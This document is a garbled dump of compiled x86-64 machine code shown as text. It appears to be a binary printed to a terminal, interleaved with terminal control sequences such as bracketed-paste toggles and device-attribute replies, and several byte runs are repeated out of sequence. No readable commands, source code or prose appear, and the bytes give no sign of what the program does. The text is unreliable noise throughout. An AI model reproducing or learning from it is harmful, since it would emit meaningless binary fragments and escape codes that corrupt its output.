+éuşÿÿDH‹Q¢H‹H‰ÿ¢éZşÿÿfÇ&¤éIşÿÿƒ<$…@Ç$HVé+şÿÿH‹	¢H‹H‰÷£éşÿÿf.„ÇD$éûıÿÿÇ$HÎVéåıÿÿHƒø…ãşÿÿIƒü…ÙşÿÿA¼1Òë€HƒÂL9âƒé¾Dƒè0ƒø	væé©şÿÿf„L‰àHƒàıHƒøtxIƒü…‰şÿÿë´€‹T$…ÒtjH‹‰¡º•¾H=0^H‹è¸ûÿÿ1ÿè¡ûÿÿH5UUH‰ïèrùÿÿHUHíT…ÀH‰ÓHEÙƒøÀƒÀ‰$éêüÿÿH‹t$I‰ôé;ÿÿÿè‰øÿÿ‰Ç…À…¤‹$ƒø„ƒø„~ƒø„D‹%Â¢‹5À¢D‰çƒø…èCúÿÿD‹5¬¢‹5ª¢D‰÷è>úÿÿ‹-¡‹=ú D‰ö‰=¢‰-¢èúÿÿD‰æ‰ïèúÿÿH‹U ‹D9èlD‰éHcĞD‰,$L%íT)ÁI×AÿHĞIDÇI‰ÆDL‹+L‰æL‰ïèøÿÿL‰ïH‰Åè÷ÿÿH9Å…ëHƒÃI9ŞuÕD‹,$ºL‰şD‰ïè‰ H‹”$hdH+[K[A[K[?2004híT…ÀH‰ÓHEÙƒøÀƒÀ‰$éêüÿÿH‹t$I‰ôé;ÿÿÿè‰øÿÿ‰Ç…À…¤‹$ƒø„ƒø„~ƒø„D‹%Â¢‹5À¢D‰çƒø…èCúÿÿD‹5¬¢‹5ª¢D‰÷è>úÿÿ‹-¡‹=ú D‰ö‰=¢‰-¢èúÿÿD‰æ‰ïèúÿÿH‹U ‹D9èl
+D‰éHcĞD‰,$L%íT)ÁI×AÿHĞIDI‰ÆDL‹+L‰æL‰ïèøÿÿL‰ïH‰Åè÷ÿÿH9Å…ëHƒI9ŞuÕD‹,$ºL‰şD‰ïè‰ H‹”$hdH+61;6;7;22;23;24;28;32;42c[K[?2004l[K[A[KéuşÿÿDH‹Q¢H‹H‰ÿ¢éZşÿÿfÇ&¤éIşÿÿƒ<$…@Ç$HVé+şÿÿH‹	¢H‹H‰÷£éşÿÿf.„ÇD$éûıÿÿÇ$HÎVéåıÿÿHƒø…ãşÿÿIƒü…ÙşÿÿA¼1Òë€HƒÂL9âƒé¾Dƒè0ƒø	væé©şÿÿf„L‰àHƒàıHƒøtxIƒü…‰şÿÿë´€‹T$…ÒtjH‹‰¡º•¾H=0^H‹è¸ûÿÿ1ÿè¡ûÿÿH5UUH‰ïèrùÿÿHUHíT…ÀH‰ÓHEÙƒøÀƒÀ‰$éêüÿÿH‹t$I‰ôé;ÿÿÿè‰øÿÿ‰Ç…À…¤‹$ƒø„ƒø„~ƒø„D‹%Â¢‹5À¢D‰çƒø…èCúÿÿD‹5¬¢‹5ª¢D‰÷è>úÿÿ‹-¡‹=ú D‰ö‰=¢‰-¢èúÿÿD‰æ‰ïèúÿÿH‹U ‹D9èlD‰éHcĞD‰,$L%íT)ÁI×AÿHĞIDÇI‰ÆDL‹+L‰æL‰ïèøÿÿL‰ïH‰Åè÷ÿÿH9Å…ëHƒÃI9ŞuÕD‹,$ºL‰şD‰ïè‰ H‹”$hdH+%(…²HÄx[]A\A]A^A_ÃH…ö…ÁşÿÿéúM‰àIÑè„î1ÀL¤$Ğ@¾TE´’ÿÿÿ¾TETrĞA‰„HƒÀI9ÀuŞI@üIƒø„?Hƒø…k„$Ğd„$Ô-l‰D$$KD„ğ‹0D‹`nÿ‹p‰t$‹p‰t$H…É„n¾Aƒè0ƒø	‡A¾QJĞƒù	‡1kÀ
+DĞ‰D$ ‹D$ HT$P‰[K[?2004hDĞ‰D$ ‹D$ HT$P‰61;6;7;22;23;24;28;32;42c[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004l[KDĞ‰D$ ‹D$ HT$P‰l$`H‰×H‰T$(‰D$P‹D$D‰d$T‰D$X‹D$ÇD$h‰D$\‹D$$ÇD$l‰D$dHÇD$xHÇ„$€ÇD$pÿÿÿÿèøÿÿH‹T$(H‰D$HHƒøÿ„3j‹D$$3B‹L$	è3JD3b	È‹L$3J	ÈA	Ä‹D$ 3A	ÄuzH‹D$HH‰D$8éSúÿÿè6õÿÿH‰ÃH…À„H‹0H=…Rè›"ƒøvpH‹3H=Rè‡"…À„ ıÿÿH‹ØŸHy[éûÿÿH|$HèâóÿÿH‰ÂH…À…\ÿÿÿfDH‹ÉL‹ éäúÿÿH…À„QèÃóÿÿÇD$ é°şÿÿ…À…¿üÿÿëè7÷ÿÿD‹5 Ÿ‹5Ÿ1ÛD‰÷è0÷ÿÿ‹-ö‹=ìD‰ö‰=Ÿ‰-qŸè÷ÿÿD‰æ‰ïèööÿÿ€|$
+„&‹5QŸ‹=GŸèÚöÿÿ‹=DŸ‹5BŸèÙöÿÿH=†Oè=ôÿÿ…À…SH=‰OL¤$ĞèñóÿÿL-;NL=”QH‰ÅH…À„ÿ€H‰ïèøõÿÿH…À„÷LpL‰æL‰÷è`õÿÿ…À…Â‹„$è%ğ=€uÅ‹§9„$ìt…Àu²€=hu©1ÀHL$HHT$7L‰îLD$@L‰÷è½õÿÿƒøuˆH…Û…V¶4„Àt
+:D$7…jÿÿÿHkD$@<H|$PL´$H‰D$Pè-òÿÿH‹ŞœL‰÷¾2H‰Áèöÿÿ‹¼$ìè
+óÿÿH…À„„L‹D¾D$7L‰ñ1ÀH‹T$HH5zP¿è½õÿÿéøşÿÿH‰ïèàóÿÿ‹5Ú‹=Øèoõÿÿ‹5Á‹=¿èNõÿÿ1ÿèöÿÿ€|$
+»btèVñÿÿI‰ÀH¾D$I‹¶‚H‹w›H‹D$8D9*Œ¹H…À„€=>…ÈH‹|$8¾óè^ëH‹=›‹D9èTD‰éHcĞD‰,$L%ÕO)ÁI×AÿHĞIDÇI‰ÆDL‹+L‰æL‰ïèóÿÿL‰ïH‰ÅèòÿÿH9Å…dHƒÃI9ŞuÕD‹,$ºL‰şD‰ïèqéãúÿÿH‹½šH‹T$8HcD9èŒÓHƒ|$8„ô€=~œ…?H‹ÌšH‹º1¾H=8Xèûôÿÿ¾t$H‹|$8è|é¹şÿÿHl$PL‰D$H‰ïH‰L$è@óÿÿH‰ïèHğÿÿH‹L$L‹D$H…À„eüÿÿ‹@‰D$$éãúÿÿ‹„$Ğ‰D$$ƒøDÏúÿÿƒÀd‰D$$éÃúÿÿH‹T$H1ÀëHƒÀH;TÃø„’ıÿÿ9D$ëéıÿÿèqH…Ò…1ÿI,Çè½òÿÿH‰îH‰Çè’>H‰D$8éÿÿÿH…À…e1ÿè˜òÿÿL‰şH‰Çèm>H‰D$8é+şÿÿH|$8è‰ïÿÿH‰ÇèÑğÿÿHDN¾H‰ÁH‹£™H‹81ÀèñóÿÿéşÿÿH|$8èRïÿÿH‰ÇèšğÿÿH‹{™¾HNH‰Á1ÀH‹;èºóÿÿé‘şÿÿH‹™D‰éHc)Á‰L$…É¿ûÿÿL,ÅHcÁE1öH<ÅH‰$MıLd$Pè#H‰ÃèûîÿÿL‹<$H‰Åë'fH‹D$PK9Dõt;€8u6‹E…Àu/IƒÆM9÷„`ûÿÿÇEK‹|õº
+L‰æèBñÿÿJ‰óH…Ày¹H=MèmD¾D$7H‹T$HL‰ñ1ÀL‰ş¿è@òÿÿé{ûÿÿ1ÿèDñÿÿH‰D$8éâüÿÿH‹{˜º¾H=MH‹èªòÿÿ¿èòÿÿèKïÿÿL‰éHÈLé9õÿÿH=NLè0òÿÿ¿èfòÿÿH=ïR1ÀèØ	H=¹R1ÀèÊ	H=àKè¾	H=ºKè²	H=kR1Àè¤	H‹å—º¾H=™LH‹èòÿÿ¿èúñÿÿL‰éHNLé¨ôÿÿf.„óú1íI‰Ñ^H‰âHƒäğPTE1À1ÉH=Aòÿÿÿ#—ôf.„H=ù—Hò—H9øtH‹—H…Àt	ÿà€Ã€H=É—H5Â—H)şH‰ğHÁî?H[K[?2004h¾H=™LHèòÿÿ¿èúñÿÿL‰éHNLé¨ôÿÿf.„óú1íI‰Ñ^H‰âHƒäğPTE1À1ÉH=Aòÿÿÿ#—ôf.„H=ù—Hò—H9øtH‹—H…Àt	ÿà€Ã€H=É—H5Â—H)şH‰ğHÁî?H61;6;7;22;23;24;28;32;42c[C[K[?2004l[KL‰æèBñÿÿJ‰óH…Ày¹H=MèmD¾D$7H‹T$HL‰ñ1ÀL‰ş¿è@òÿÿé{ûÿÿ1ÿèDñÿÿH‰D$8éâüÿÿH‹{˜º¾H=MH‹èªòÿÿ¿èòÿÿèKïÿÿL‰éHÈLé9õÿÿH=NLè0òÿÿ¿èfòÿÿH=ïR1ÀèØ	H=¹R1ÀèÊ	H=àKè¾	H=ºKè²	H=kR1Àè¤	H‹å—º¾H=™LH‹èòÿÿ¿èúñÿÿL‰éHNLé¨ôÿÿf.„óú1íI‰Ñ^H‰âHƒäğPTE1À1ÉH=Aòÿÿÿ#—ôf.„H=ù—Hò—H9øtH‹—H…Àt	ÿà€Ã€H=É—H5Â—H)şH‰ğHÁî?HÁøHÆHÑştH‹—H…ÀtÿàfDÃ€óú€=•—u+UHƒ=â–H‰åtH‹=—èYìÿÿèdÿÿÿÆm—]ÃÃ€óúéwÿÿÿ€H‹©—L‹Š—AWAVD‹¿—AUATUSH‰D$øI9ÂƒÒ1íL=ÚbL_D‰ÚH=éZLaH»`A¶„À„¬H5ed¶‰ÎHcÒ¸fAƒ<WEèA¿PMEêDEâÈH˜D¿4GA9Öt0A¿QA‰ÓfúÒ~HcÉ¶4HcÒ@¶ÎA¿PÈH˜fD;GuÓH5<VIƒÂ¿F‰ÂL;T$ø…oÿÿÿA‰Ã@„ítL‰-¨–D‰%©–[D‰Ø]A\A]A^A_Ã¹¾éRÿÿÿóúATUHƒì‹g—…Àu
+¿è±ïÿÿ‹-O—D‹%D—‰îD‰çèÚîÿÿH=³•èNëÿÿD‰æ‰ïèÄîÿÿëÇfATI‰ø¾HSEUHƒì[K[?2004h¿è±ïÿÿ‹-O—D‹%D—‰îD‰çèÚîÿÿH=³•èNëÿÿD‰æ‰ïèÄîÿÿëÇfATI‰ø¾HSEUHƒ61;6;7;22;23;24;28;32;42c[C[K[?2004l[K¿è±ïÿÿ‹-O—D‹%D—‰îD‰çèÚîÿÿH=³•èNëÿÿD‰æ‰ïèÄîÿÿëÇfATI‰ø¾HSEUHƒìH‹+•H‹Ì–H‹81Àèrïÿÿ‹ô–…Àu
+¿è>ïÿÿ‹-Ü–D‹%Ñ–‰îD‰çègîÿÿH=@•èÛêÿÿD‰æ‰ïèQîÿÿëÇff.„@óúPXH=ßDHƒìèjÿÿÿf.„PXH=ÇKº5¾HƒìH‹Š”H‹èÊîÿÿ¿è°îÿÿAUº	ATUH‰õ¾SH‰ûH=–DHƒìL‹%P”I‹$èîÿÿH9ëw)L-JG¾I‹<$L‰ê¾1ÀHƒÃèvîÿÿH9İsáI‹4$HƒÄ¿
+[]A\A]ééëÿÿf„ƒş2H9DUHcÖH(DH‰ı¾HMÈH(ŒL‹ĞHD1ÀèîÿÿH‰î¿)]é˜ëÿÿ„PXH1H¾HƒìH‹“H‰ùH‹81ÀèÚíÿÿ¿è°íÿÿL‹A”H‰ùM…Àt!H‹b“H¼C¾H‹81Àé¤íÿÿ@LšCL‰
+”ëÏÃff.„@AUATUH‰õSH‰ûHƒìèûèÿÿD‹(I‰ÄH‹”H…Û„ÕH‹SÇCÆH‹SÆBH‹SÇC(H‰SÇC8H…Àt\H‹Å“H;Èt_H‰+ÇC4H;ÈtHÇC,1ÀH…ítH‰ïè`ëÿÿ‰Çèùèÿÿ…ÀŸÀ¶À‰C$E‰,$HƒÄ[]A\A]Ã€H‰+ÇC4ëµ@‹sH‰N“H‰/“¶‰5“H‹3ˆ1“H‰5N“érÿÿÿf„H‰,%Ç%4H‹“H…À…PÿÿÿéQÿÿÿ„HƒìèçêÿÿH…ÀtHƒÄÃH‹Ş‘º¾H=GBH‹èìÿÿ¿èóëÿÿATUH‰ı¿@HƒìèœêÿÿH…Àt=Ç@@¿@I‰ÄèƒêÿÿI‰D$H…ÀtAÇD$ H‰îL‰çèEşÿÿHƒÄL‰à]A\ÃH=»Iè®ıÿÿff.„ATUH-–’SH‰ûH‰ïHƒìPfoƒ’fo‹’dH‹%(H‰D$H1Àfoƒ’H‹Œ’Ld$)D$)L$ )T$0H‰D$@è.êÿÿL‰çHHƒøÿHEÚH‰\$è•æÿÿóo)’óo`)%’óoh )-"’H‹@0H‰'’H‹x‹0…ö"H‹D$HdH+%(…¢HƒÄP[]A\ÃDH|$è®éÿÿH‰ïè¦éÿÿ‹L$0…É~N‹È‘…ÒºHD$L‰çèæÿÿóo0)5ˆ‘óox)=Œ‘óop )5‘H‹@0H‰•‘évÿÿÿ‹z‘…ÀhÿÿÿHl$L‰çè±åÿÿóo8)=6‘ë¬èÏæÿÿff.„@U†æşÿÿSHƒìƒø‡+HdMHcßHc‚HĞ>ÿà€H-é÷H‰ïÇöÿÿÿÿHƒÄ[]é»èÿÿH‰ßHƒÄHÁçH)ß[]HÁçéşÿÿ€HcûHƒÄHiÿ[]éóıÿÿHcûHƒÄHiÿ€Q[]éÛıÿÿHcûHƒÄHiÿ€:	[]éÃıÿÿH-Y‰Øay/1ÛDƒëƒÀxøH‰ï‰GÇMÿÿÿÿèèÿÿé:ÿÿÿHcØ™H‰ïÇ/ÿÿÿÿHiÛ«ªª*HÁû!)Ó[Áâ)Ğ‰èßçÿÿ…Û…şşÿÿHƒÄ[]ÃH=?‰t$èûÿÿH‹q‹L$H?¾H‹81Àè¯èÿÿè*äÿÿf.„ATUHìèH‰´$8H‰”$@H‰Œ$HL‰„$PL‰Œ$X„Àt@)„$`)Œ$p)”$€)œ$)¤$ )¬$°)´$À)¼$ĞdH‹%(H‰„$(1ÀHl$ I‰øI‰áH„$¹ºH‰ïH‰D$¾H„$0Ç$ÇD$0H‰D$èÌæÿÿH‰ïèdçÿÿ‹F…Àu
+¿èçÿÿ‹-.D‹%#‰îD‰çè¹æÿÿH=’[K[?2004h¿èçÿÿ‹-.D‹%#‰îD‰çè¹æÿÿH=’61;6;7;22;23;24;28;32;42c[C[K[?2004l[K¿èçÿÿ‹-.D‹%#‰îD‰çè¹æÿÿH=’è-ãÿÿD‰æ‰ïè£æÿÿëÇAW¹AVAUL-Ù=ATA‰ôUSHìøH‰|$8L¼$XL´$PL‰ÿdH‹%(H‰„$è1ÀóH«H;÷ÿÿL‰ÿH‰„$Pèåÿÿ1ÒL‰ö¿Ç„$Øè!ãÿÿèŒâÿÿ¿GÇH‰D$ è—æÿÿº€‹5X‹=N…ÀOĞ‰T$èØåÿÿ‹5F‹=<è×åÿÿ1À¾L‰ïè(æÿÿ…Àˆ4L‰ÿ‰ÅL|$PÇD$PHÇD$XH^÷ÿÿHÇD$`H‰„$PèXäÿÿL‰ö1Ò¿Ç„$Øènâÿÿ¿
+è”ãÿÿL‰ú¾‰ï1Àècâÿÿ1ÿè|ãÿÿH5¬<L‰ïHÇD$Hè¤åÿÿI‰ÆH…À„ªH‰ÇHT$HH5ƒ<1ÀèÒáÿÿL‰÷èÊâÿÿH‹D$HL‰÷Hº	€€HpH‰ğH÷êH‰ğHÁø?H2HK<HÁùH)ÁH‰ÈHÁàH)ÈH)Æ1ÀH‰ñH‰t$H¾è”åÿÿL‰÷èÜáÿÿH‹D$HH‰D$Hƒøÿ„5H‹L$8E¾ÌHº‰ˆˆˆˆˆˆˆL%u‹¾L<L‰çH‰ÈH÷ê1ÀHÊHÁù?HÁúH)Ê¹Rºÿt$èuàÿÿ¶5‹YL‰à^„ÒtD€ú uÆ0¶PHƒÀ„ÒuìH„$ÀL5íŠH‰ÆL‰÷H‰D$0èíâÿÿ…ÀtH‹D$ ƒ8…
+¿ÀèÁâÿÿ‹=3Œ‰D$(èåÿÿºL‰÷1À¾ÁèäÿÿA‰Åƒøÿ„w
+D‹%ŒD‰çèÓäÿÿD‰ïè{áÿÿ‰D$…ÀˆF
+D‹ì‹‹â‹D‰Ç‰ŞD‰D$,èsãÿÿD‹5Ä‹D‰çD‰öèQãÿÿD‰æD‰÷èFãÿÿ‹t$,‰ßèKãÿÿD‹%Š‹=Š‰Ş‰=š‹D‰%‹‹è*ãÿÿD‰öD‰çèãÿÿL‰ú¾‰ï1ÀÇq‹ÇD$PHÇD$XHÇD$`èúßÿÿ‰ïè#áÿÿH5=D‰ïèôâÿÿH‰ÅH…À„s	H‹=‹H…ÿ„ èsáÿÿH…À„êL‹-óŠM…í„JA€}„?L‰ïèçßÿÿHc\$H9Ø‡)H‹=ºŠH…ÿtH‹¦ˆH5`<H‹èWàÿÿH…À„m‹ˆŠHƒìM‰éH‰ïD‹—Š‹‰Š¾HåAP1Àèıâÿÿ‹L$8¾1ÀH:H‰ïèãâÿÿH‹\ˆL‹ XZM‹4$M…ötuè	ãÿÿI‰ÇfDI¾I‹7H‰Ğ·V„Ò„:€ú=„1‰ÙL‰òë*f.„¶BHƒÂ<=„„À„H¾È·NƒáuÛ<_t×M‹t$IƒÄM…öu™H‰éº¾H=~9è0âÿÿL‹%‘‰M…ä„'H‹	ˆL‹l$ H˜ÿë?Aƒ}"…éL‰çèeİÿÿH‰ßH‰Û‡HÃÿèàÿÿI‰ÄH…À„ÍH‰4‰H³ÿÿÿL‰çèıŞÿÿH…Àt°M¾,$Hù8E„íu;ëcDA€ı/tèåáÿÿH‹Böh„·A¾<$H‰îIƒÄèßÿÿM¾,$E„ít*A€ı
+uÆH‰éº¾H‰ßèQáÿÿM¾l$IƒÄE„íuÖH‰éº?¾H=N@è)áÿÿH‹’†H‹;èšßÿÿ‰Çè3İÿÿA‰Ä…À…1L5y8H‹;è8áÿÿA‰ÅƒøÿtLH‰îD‰ïè…ŞÿÿAƒı
+ußE…ätÚL‹-‹†º¾L‰÷I‹Mè½àÿÿI‹}ètßÿÿH‹;èìàÿÿA‰Åƒøÿu´E…ä…Ÿ¿
+H‰îè.ŞÿÿH‰ïè–Üÿÿ…À…„H‰ïè6ßÿÿH‰ïè~Üÿÿ…À…lH‹;ènÜÿÿ…À…™H‰ïè®Üÿÿ‹|$¾Àè°ßÿÿ…Àˆm‹|$Hl$pèšİÿÿH|$8è ÛÿÿH‹Q†H‰ï¾2H‰Áè‰ßÿÿH‹L$I‰è1ÀH‹°…H¤7¾H‹;èôßÿÿ1öH=71Àèdßÿÿ‰Åƒøÿ„•H‹t$0‰ÇèíßÿÿƒøÿtH¸ğÿÿÿÿH#„$ØH=€„ù‰ïèİÿÿH[K[?2004hH‰îè.ŞÿÿH‰ïè–Üÿÿ…À…„H‰ïè6ßÿÿH‰ïè~Üÿÿ…À…lH‹;ènÜÿÿ…À…™H‰ïè®Üÿÿ‹|$¾Àè°ßÿÿ…Àˆm‹|$Hl$pèšİÿÿH|$8è ÛÿÿH‹Q†H‰ï¾2H‰Áè‰ßÿÿH‹L$I‰è1ÀH‹°…H¤7¾H‹;èôßÿÿ1öH=71Àèdßÿÿ‰Åƒøÿ„•H‹t$0‰ÇèíßÿÿƒøÿtH¸ğÿÿÿÿH#„$ØH=€„ù‰ïèİÿÿH61;6;7;22;23;24;28;32;42c[K[?2004l[KH‰îè.ŞÿÿH‰ïè–Üÿÿ…À…„H‰ïè6ßÿÿH‰ïè~Üÿÿ…À…lH‹;ènÜÿÿ…À…™H‰ïè®Üÿÿ‹|$¾Àè°ßÿÿ…Àˆm‹|$Hl$pèšİÿÿH|$8è ÛÿÿH‹Q†H‰ï¾2H‰Áè‰ßÿÿH‹L$I‰è1ÀH‹°…H¤7¾H‹;èôßÿÿ1öH=71Àèdßÿÿ‰Åƒøÿ„•H‹t$0‰ÇèíßÿÿƒøÿtH¸ğÿÿÿÿH#„$ØH=€„ù‰ïèİÿÿH‹„$èdH+%(…¬HÄø[]A\A]A^A_Ãf.„¾=L‰÷è3ÜÿÿH‰D$€ç…îüÿÿL‹l$H5¯5L‰÷H§M)õL‰êèôÚÿÿ…À„ÅüÿÿHÍH9Ãt&H‹3L‰êL‰÷HƒÃèÎÚÿÿ…À„ŸüÿÿH§H9ÃuÚL‹l$L‰÷H‰é¾I]H‰ÚL)òI‰ŞèÈŞÿÿA¶EI½(ø$„Àu]éˆI‹H¾ĞöQu3<=ãƒè@<=wH¿¨(H£ÇrH‰î¿\èÜÿÿ€A¾>H‰îIƒÆèÜÿÿA¶„Àt0<
+u¤H‰éº¾IƒÆH=‰5è7ŞÿÿA¶„Àu×€H‰éº	¾IƒÄH=a5èŞÿÿI‹|$øH‰é¾H)ûHSÿèòİÿÿH‰î¿
+è…ÛÿÿM‹4$M…ö…(ûÿÿéŠûÿÿH‰î¿\ècÛÿÿé7üÿÿfD<",ÿÿÿI£Õƒ"ÿÿÿé1ÿÿÿH5Ë6‰ïèãÜÿÿI‰ÄH…À„íıÿÿH‰ÇHT$HH5@61ÀèaÙÿÿL‰çƒè…OèÀÙÿÿD‹%å„D‹-Ú„D‰æD‰ïègÜÿÿD‹5Ô„D‹=É„D‰öD‰ÿè^Üÿÿ‹|$H¾è€ÛÿÿƒÀ„ID‰şD‰÷è<ÜÿÿD‰îD‰çè!ÜÿÿéiıÿÿH‹­‚º¾H=a4H‹èÜÜÿÿé<üÿÿH|$8Lt$pèHØÿÿL‰÷¾2H"4H‰Áè1ÜÿÿL‰ñ¾1ÀL‹-X‚HT4I‹}è ÜÿÿI‹Mº¾H=ó3èvÜÿÿI‹}è-Ûÿÿé`ûÿÿèCÛÿÿI‰ÅH…À„A€}uD‹=ÒƒèÅØÿÿH…À„ÒøÿÿL‹(éÁøÿÿH‹º7¾H=¨;èÜÿÿéƒüÿÿèqØÿÿéyüÿÿL‰ïèôÙÿÿH…À…‘øÿÿë©H‹=âè­ïÿÿH‰NƒI‰ÄH…À…ºùÿÿH=.3è>ìÿÿH‹D$ D‰şD‰÷‹(èìÚÿÿD‰îD‰çèÑÚÿÿƒıuH‹º¾H=€;è“Ûÿÿéûûÿÿ/…í„ñûÿÿƒí…ŸH‹º%¾H=';èbÛÿÿéÊûÿÿƒıu|H= 3è¼ëÿÿH=]2è@×ÿÿI‰ÅH…À…İşÿÿ‹=¶‚è©×ÿÿH…À…äşÿÿH=á9è„ëÿÿH=m:1ÀèvòÿÿH‹·€º¾H= 1H‹èæÚÿÿ¿èÌÚÿÿH=İ:è@ëÿÿè{×ÿÿH=a21Àè-òÿÿH=G2è!ëÿÿH‹5"‚H=Ã1èòÿÿH=91ÀèòÿÿHl$pL‹‚¹P1ÀH‰ïº¾PLi1èÄÕÿÿH‰ïèÌêÿÿH=81Àè¾ñÿÿH584L‰ïèßÙÿÿI‰ÆH…À…YôÿÿH=Ò01Àè•ñÿÿH=1è‰êÿÿH=Ş01Àè{ñÿÿL‰öH=©81ÀèjñÿÿH=w1è^êÿÿff.„AWAVAUATUSHìø‰T$(dH‹%(H‰”$èH‹+‹9ú;‰øH‰ñHcòÇD$,)ĞHñƒèH‰\$HğHDÁH‰D$ fD‹5ş€‹=ô€è‡Øÿÿ‹5õ€‹=ë€è†ØÿÿH=31èêÕÿÿ‰D$…À…ÂH=21è¢ÕÿÿI‰ÅH…À„Å‹5°€‹=®€èEØÿÿ‹5—€‹=•€è$ØÿÿHD$PH‰D$f.„L‰ïèˆ×ÿÿI‰ÇH…À„D‹5a€‹W€IƒÇD‰ö‰ßèá×ÿÿD‹%N€‹-D€D‰æ‰ïèÚ×ÿÿH‹t$L‰ÿè½Öÿÿ…À…Ú‰îD‰çè»×ÿÿ‰ŞD‰÷è¡×ÿÿ1ÀHL$@L‰ÿHT$?LD$HH5'/è1×ÿÿƒø…hÿÿÿH‹D$º
+1öH‹8ètÖÿÿH˜H;D$@…Gÿÿÿ9\$lt…Û…ø‹D$(ƒø…ÜD‰æ‰ïèB×ÿÿ€|$?=„'L‰ÿè¯Óÿÿ…À…µ‹5‹=è×ÿÿL‰ïÇD$èvÖÿÿI‰ÇH…À…îşÿÿf.„L‰ïèHÕÿÿƒ|$t-H‹D$HÙ/¾H‹H‹N[K[?2004h1öH‹8ètÖÿÿH˜H;D$@…Gÿÿÿ9\$l…Û…ø‹D$(ƒø…ÜD‰æ‰ïèB×ÿÿ€|$?=„'L‰ÿè¯Óÿÿ…À…µ‹5‹=è×ÿÿL‰ïÇD$èvÖÿÿI‰ÇH…À…îşÿÿf.„L‰ïèHÕÿÿƒ|$t-H‹D$HÙ/¾HH‹N61;6;7;22;23;24;28;32;42c[K[?2004l[K1öH‹8ètÖÿÿH˜H;D$@…Gÿÿÿ9\$lt…Û…ø‹D$(ƒø…ÜD‰æ‰ïèB×ÿÿ€|$?=„'L‰ÿè¯Óÿÿ…À…µ‹5‹=è×ÿÿL‰ïÇD$èvÖÿÿI‰ÇH…À…îşÿÿf.„L‰ïèHÕÿÿƒ|$t-H‹D$HÙ/¾H‹H‹N}H‹81Àèœ×ÿÿÇD$,HƒD$H‹D$H;D$ …öıÿÿH‹„$èdH+%(…Ö‹D$,HÄø[]A\A]A^A_Ãƒø…Š‰ïD‰æè]ÖÿÿH5W0L‰ÿè¾ÖÿÿH‰ÅH…Àué¾H‹q|H‹0èáÔÿÿH‰ïè9×ÿÿ‰ÇƒøÿuâH‰ïèJÓÿÿéîşÿÿDH‹‘|º¾H=p7H‹èÀÖÿÿé´şÿÿH=471ÀèîÿÿH‹^|¹¾H]7H‹81Àè›Öÿÿ¿èqÖÿÿè,ÓÿÿH=¥61ÀèŞíÿÿÇD$,éóşÿÿH=²61ÀèÃíÿÿL‰şH=j.1Àè²íÿÿL‰şH=D.1Àè¡íÿÿH‹D$H".¾H‹H‹Î{H‹81ÀèÖÿÿ¿èòÕÿÿfAVI‰şAUI‰õATUSHì‹5q}‹=g}dH‹%(H‰„$1ÀèçÔÿÿ‹5U}‹=K}èæÔÿÿH5à.L‰÷èGÕÿÿ‹51}‹=/}H‰ÅèÃÔÿÿ‹5}‹=}è¢ÔÿÿH…í„á»
+I‰äH‰ê¾L‰çèÓÿÿH…À„˜L‰çèßÑÿÿ¾\ÿHPÿƒû
+uëg€H‰ïè€Òÿÿ‰Ãƒø
+tƒûÿuìL‰îL‰çèéÒÿÿ…Àu¥A¼H‰ïègÑÿÿƒûÿtHH‹„$dH+%(u]HÄD‰à[]A\A]A^Ã@L‰îL‰çÆè™Òÿÿ…À…QÿÿÿëªE1äë«H‹kzL‰ñ¾Hî,H‹81ÀèªÔÿÿë–AƒÌÿëè=Ñÿÿff.„fUSHƒìH‹=3{H…ÿtnH‹×zHPÿH;{v
+HƒÄ[]ÃHXH,İH‰îè|ÓÿÿH‰õzH…ÀthHD(ÀfïÀH‰z@@ @0HƒÄ[]Ãf.„¾¿è±ÑÿÿH‰ªzH…ÀtHÇJzHÇ‡zHƒÄ[]ÃH=±4èÌåÿÿff.„óúAWAVAUATUSHƒìXD‹szE…À„oL‹7z¶,zD‰èHÆAM‰ÕL5|EH-•=A‰ÂL%«CL=dC‹=&zAˆL‰êM‰İL‰\$E‰ÓHc÷E1ÀA¹¿sDLñFfAƒ<vE¶
+DEßIEÕEEÁDĞH˜¿LE9Ït*@A¿4t‰ñfşÒ~G¶Hcö¿sDĞH˜f;LEuÚH=Û8IƒÅH¿4G¿s‰÷f=ÒtA¶Më‡€E„ÀtD‰DyH‰5yH‰T$L6D‰\$(L‹\$A¿v…ÀuHcyL‹-yA¿FL‰êL‰ñxL‰éL)ÚL‰-üx‰T$‰ÒxA¶UAÆEˆŞxƒø1‡5Ic€LÀ>ÿàÇñx‹=çx…ÿu
+ÇÙxHƒ=Éx„Hƒ=³x„¡H‹xH…ÀtDH‹ŠxH‹ĞH…Àt4L‹X‹PH‹A¶‰5xL‰^xL‰?xH‰pxˆFxéşÿÿL‰T$èıÿÿH‹<xH‹=xH‹=FxHĞèmåÿÿL‹T$H‰ëšH‹ÌvHƒ=xH‹H‰x…_ÿÿÿH‹¥vH‹H‰ûwH‹ìwH…À…JÿÿÿëŒH‹=²wè5ÑÿÿH‰–w¸HƒÄX[]A\A]A^A_ÃD‹T$(H‹¶wºHct$H‹=uwL‹l$D‰T$èÎĞÿÿL‹wwD‹T$¶gwébıÿÿH‹=GwèÊĞÿÿH‰+w¸(ë“H‹=-wè°ĞÿÿH‰w¸'évÿÿÿH‹=wè“ĞÿÿH‰ôv¸&éYÿÿÿH‹=óvèvĞÿÿH‰×v¸é<ÿÿÿH‹ÖvH‰ßèVĞÿÿH‰·v¾éÿÿÿH‹=¸vè;ĞÿÿH‰œv¸éÿÿÿH‹=›vèĞÿÿH‰v¸éäşÿÿL‹~vH‰ÈH‹”vL)ÈH‰T$0ƒè‰D$,¶rvˆH‹}vHĞH‰D$H‹‹p8I‰Â…ö„¨[K[?2004h~vH‰ÈH‹”vL)ÈH‰T$0ƒè‰D$,¶rvˆH‹}vHĞH‰D$H‹‹p8I‰Â…ö„¨61;6;7;22;23;24;28;32;42c[K[?2004l[KÇÙxHƒ=Éx„Hƒ=³x„¡H‹xH…ÀtDH‹ŠxH‹ĞH…Àt4L‹X‹PH‹A¶‰5xL‰^xL‰?xH‰pxˆFxéşÿÿL‰T$èıÿÿH‹<xH‹=xH‹=FxHĞèmåÿÿL‹T$H‰ëšH‹ÌvHƒ=xH‹H‰x…_ÿÿÿH‹¥vH‹H‰ûwH‹ìwH…À…JÿÿÿëŒH‹=²wè5ÑÿÿH‰–w¸HƒÄX[]A\A]A^A_ÃD‹T$(H‹¶wºHct$H‹=uwL‹l$D‰T$èÎĞÿÿL‹wwD‹T$¶gwébıÿÿH‹=GwèÊĞÿÿH‰+w¸(ë“H‹=-wè°ĞÿÿH‰w¸'évÿÿÿH‹=wè“ĞÿÿH‰ôv¸&éYÿÿÿH‹=óvèvĞÿÿH‰×v¸é<ÿÿÿH‹